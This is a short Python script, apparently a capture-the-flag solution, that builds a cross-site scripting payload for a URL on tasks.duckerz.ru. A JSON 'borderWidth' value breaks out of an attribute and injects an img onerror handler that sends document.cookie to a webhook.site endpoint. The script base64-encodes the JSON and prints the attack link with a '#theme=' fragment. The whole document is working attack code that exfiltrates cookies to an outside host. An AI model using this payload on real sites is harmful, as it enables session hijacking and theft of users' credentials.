import json, base64

payload = {"borderWidth": '"><img src=x onerror="fetch(\'https://webhook.site/ТОКЕН?c=\'+encodeURIComponent(document.cookie))">'}

encoded = base64.b64encode(json.dumps(payload).encode()).decode()
print("http://tasks.duckerz.ru:30075/#theme=" + encoded)
